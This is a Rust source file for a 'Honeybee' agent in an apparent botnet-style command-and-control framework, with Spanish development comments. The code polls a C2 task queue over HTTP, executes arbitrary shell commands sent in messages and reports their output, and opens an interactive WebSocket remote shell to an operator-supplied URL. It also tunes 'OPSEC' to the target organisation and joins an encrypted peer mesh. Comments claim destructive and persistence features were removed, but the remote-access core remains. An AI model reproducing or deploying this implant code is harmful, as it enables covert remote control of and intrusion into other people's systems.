use hive_base::phoenix::{AgentBlueprint, Phoenix};
use hive_base::{AgentIdentity, ConsensusEngine, Decision, HiveChamber, Message, Payload, Role};
use sha2::{Digest, Sha256};
use std::collections::HashMap;
use std::time::Duration;
use tokio::time;
use tracing::{info, warn};
use uuid::Uuid;

#[derive(Debug, Clone, PartialEq)]
enum HoarderState {
    Idle,
    WaitingForConsensus,
    Executing,
    Complete,
}

struct HoarderAgent {
    comms: HiveChamber,
    identity: AgentIdentity,
    consensus: ConsensusEngine,
    whispernet: hive_base::whispernet::WhisperNet,
    state: HoarderState,
    active_proposals: Vec<Uuid>,
    heartbeat_interval: Duration,
    interactive_shell: Option<hive_base::remote_shell::WsShell>,
}

impl HoarderAgent {
    async fn new() -> Self {
        let identity = AgentIdentity::new();
        // TaskPoller (ronda 4): cierra el ciclo operador → agente → resultado
        // vía la cola HTTP del C2 (HIVE_C2_URL). Sin C2 configurado, no arranca.
        let _ = hive_base::task_poller::spawn_from_env(identity.id(), "honeybee");
        let comms = HiveChamber::connect(&identity, Role::Honeybee)
            .await
            .expect("Failed to connect to colmena arena");

        let cfg = hive_base::config::HiveConfig::load();
        info!("Honeybee: capacidades destructivas no presentes en este build (ronda 6)");

        let whispernet =
            hive_base::whispernet::WhisperNet::new(hive_base::whispernet::WhisperConfig {
                node_id: identity.id(),
                listen_port: 0,
                max_peers: 16,
                max_hops: 5,
                heartbeat_interval_secs: 60,
                encryption_enabled: true,
            });

        let mut agent = Self {
            comms,
            identity,
            consensus: ConsensusEngine::new(cfg.consensus.hoarder_threshold),
            whispernet,
            state: HoarderState::Idle,
            active_proposals: Vec::new(),
            heartbeat_interval: Duration::from_secs(cfg.timing.heartbeat_interval_secs),
            interactive_shell: None,
        };

        agent.setup_phoenix_genome();
        agent.calibrate_opsec();

        agent
    }

    fn calibrate_opsec(&self) {
        let profile = hive_base::smoke_signals::learn_org_profile();
        self.comms.calibrate_opsec(&profile);
        info!("OPSEC: calibrated from org profile");
    }

    fn setup_phoenix_genome(&mut self) {
        // Ronda 6: snapshot del genoma SOLO en memoria. Sin ocultación ni
        // escrituras (las APIs de hide/persistencia fueron eliminadas).
        let exe_path = std::env::current_exe();
        let binary_hash = exe_path
            .as_ref()
            .ok()
            .and_then(|p| std::fs::read(p).ok())
            .map(|d| {
                let hash = Sha256::digest(&d);
                format!("{:x}", hash)
            })
            .unwrap_or_else(|| "unknown".into());

        let binary_size = exe_path
            .as_ref()
            .ok()
            .and_then(|p| std::fs::metadata(p).ok())
            .map(|m| m.len())
            .unwrap_or(0);

        let mut policies = HashMap::new();
        policies.insert("safe_mode".into(), "true".into());

        let blueprint = AgentBlueprint {
            role: "honeybee".into(),
            binary_hash,
            binary_size,
            policy: policies,
            encrypted_chunk: vec![],
        };

        let genome = Phoenix::generate_genome(vec![blueprint]);
        let fragments = Phoenix::fragment_genome(&genome, 3);
        info!(
            "Phoenix: genoma {} fragmentado en {} fragmentos (en memoria)",
            genome.genome_id,
            fragments.len()
        );
    }

    async fn publish_msg(&self, msg: Message) {
        self.comms.publish(msg).await;
    }

    async fn send_heartbeat(&self) {
        self.comms.send_heartbeat().await;
    }

    async fn process_incoming(&mut self) {
        let messages = self.comms.read_new().await;

        for msg in messages {
            self.consensus.process_message(&msg);
            if msg.is_kill_switch() {
                warn!("Kill switch received - agent self-destructing now");
                std::process::exit(0);
            }
            match &msg.payload {
                Payload::Proposal {
                    action,
                    argument: _,
                    proposal_id,
                } => {
                    // Ronda 11: política de voto compartida en hive_base
                    // (misma deny-list de la ronda 6 que worker/drone y el
                    // TaskPoller) en lugar de una lista local divergente.
                    let decision = hive_base::hivemind::HiveMind::vote_decision_for(action);
                    if decision == Decision::Reject {
                        // La colonia ya no participa en propuestas
                        // destructivas — la capacidad no existe en el build.
                        info!(
                            "Proposal '{}' rejected: destructive capability removed (ronda 6)",
                            action
                        );
                        continue;
                    }
                    info!(
                        "Action proposal: {} (from {}) — voting Support",
                        action, msg.agent_role
                    );
                    if !self.active_proposals.contains(proposal_id) {
                        if self.active_proposals.len() >= 128 {
                            self.active_proposals.clear(); // acotado
                        }
                        self.active_proposals.push(*proposal_id);
                    }
                    let vote = Message::vote(
                        self.identity.id(),
                        Role::Honeybee,
                        *proposal_id,
                        Decision::Support,
                        1.0,
                    );
                    self.publish_msg(vote).await;
                    self.state = HoarderState::WaitingForConsensus;
                }
                Payload::Belief {
                    asset,
                    value,
                    confidence,
                } => {
                    info!("Belief: {} = {:?} ({})", asset, value, confidence);
                }
                Payload::StatusEvent {
                    event_type,
                    subject_id,
                    ..
                } if event_type == "agent_dead" => {
                    warn!("Agent {} reported DEAD", subject_id);
                }
                Payload::Request { service, payload } if service == "exec" => {
                    if let Ok(cmd_data) = serde_json::from_slice::<serde_json::Value>(payload) {
                        let cmd = cmd_data["cmd"].as_str().unwrap_or("id").to_string();
                        let cmd_id = cmd_data["cmd_id"].as_str().unwrap_or("unknown");
                        info!("EXEC: executing cmd_id={}: {}", cmd_id, cmd);
                        let result = hive_base::remote_shell::execute_command(&cmd);
                        let result_msg = Message::belief(
                            self.identity.id(),
                            Role::Honeybee,
                            format!("exec:result:{}", cmd_id),
                            hive_base::Value::String(format!(
                                "exit={} duration={}ms stdout={} stderr={}",
                                result.exit_code,
                                result.duration_ms,
                                result.stdout.trim().chars().take(500).collect::<String>(),
                                result.stderr.trim().chars().take(200).collect::<String>(),
                            )),
                            if result.exit_code == 0 { 1.0 } else { 0.5 },
                        );
                        self.publish_msg(result_msg).await;
                    }
                }
                Payload::Request { service, payload } if service == "shell" => {
                    if let Ok(cmd_data) = serde_json::from_slice::<serde_json::Value>(payload) {
                        let ws_url = cmd_data["url"]
                            .as_str()
                            .unwrap_or("ws://127.0.0.1:9000/shell");
                        let cmd_id = cmd_data["cmd_id"].as_str().unwrap_or("unknown");
                        info!("SHELL: starting interactive shell -> {}", ws_url);
                        let shell = hive_base::remote_shell::WsShell::start(ws_url);
                        let prev = self.interactive_shell.replace(shell);
                        if let Some(mut old) = prev {
                            old.stop();
                        }
                        let result_msg = Message::belief(
                            self.identity.id(),
                            Role::Honeybee,
                            format!("shell:result:{}", cmd_id),
                            hive_base::Value::String("started".into()),
                            1.0,
                        );
                        self.publish_msg(result_msg).await;
                    }
                }
                Payload::Request { service, .. } if service == "shell_stop" => {
                    info!("SHELL: stopping interactive shell");
                    if let Some(mut shell) = self.interactive_shell.take() {
                        shell.stop();
                    }
                }
                _ => {}
            }

            for pid in self.active_proposals.clone() {
                if let Some((reached, ratio, total)) = self.consensus.check_consensus(&pid) {
                    if reached && self.state == HoarderState::WaitingForConsensus {
                        info!(
                            "Consensus reached for {} (ratio: {:.2}, weight: {:.2})",
                            pid, ratio, total
                        );
                        self.state = HoarderState::Executing;

                        if let Some(record) = self.consensus.proposals.get(&pid) {
                            info!(
                                "Executing: {} (consensus confirmed) — operación interna de la colonia",
                                record.action
                            );
                        }
                        self.state = HoarderState::Complete;
                    }
                }
            }
        }
    }

    async fn check_pending_consensus(&mut self) {
        for pid in self.active_proposals.clone() {
            if let Some((reached, ratio, total)) = self.consensus.check_consensus(&pid) {
                if reached && self.state == HoarderState::WaitingForConsensus {
                    info!(
                        "Consensus reached for {} (ratio: {:.2}, weight: {:.2})",
                        pid, ratio, total
                    );
                    self.state = HoarderState::Executing;

                    if let Some(record) = self.consensus.proposals.get(&pid) {
                        info!(
                            "Executing: {} (consensus confirmed via timer) — operación interna de la colonia",
                            record.action
                        );
                    }
                    self.state = HoarderState::Complete;
                } else if reached {
                    info!(
                        "Consensus reached but state not waiting (state={:?}), ignoring",
                        self.state
                    );
                }
            }
        }
    }

    async fn run(&mut self) {
        info!("Hive Honeybee starting | ID: {}", self.identity.id());
        self.send_heartbeat().await;
        let mut heartbeat_timer = time::interval(self.heartbeat_interval);
        let mut whisper_timer = time::interval(Duration::from_secs(60));
        let mut consensus_timer = time::interval(Duration::from_secs(30));

        loop {
            tokio::select! {
                _ = heartbeat_timer.tick() => { self.send_heartbeat().await; }
                _ = whisper_timer.tick() => {
                    self.whispernet.rebuild_routing_table();
                    info!("WhisperNet: {} peers, {} msgs queued",
                        self.whispernet.peers().len(), self.whispernet.messages().len());
                }
                _ = consensus_timer.tick() => {
                    self.check_pending_consensus().await;
                }
                _ = time::sleep(Duration::from_millis(200)) => { self.process_incoming().await; }
            }
        }
    }
}

#[tokio::main]
async fn main() {
    hive_base::utils::init_logging("honeybee");
    info!("Initializing Hive Honeybee...");
    let mut hoarder = HoarderAgent::new().await;
    hoarder.run().await;
}
